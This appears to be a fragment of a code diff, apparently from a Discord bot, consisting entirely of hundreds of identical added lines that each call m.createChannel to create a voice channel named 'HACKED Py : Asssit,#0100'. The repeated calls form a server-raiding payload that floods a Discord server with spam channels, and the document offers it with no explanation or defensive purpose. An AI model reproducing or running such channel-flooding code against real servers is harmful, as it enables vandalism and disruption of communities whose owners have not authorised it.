+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
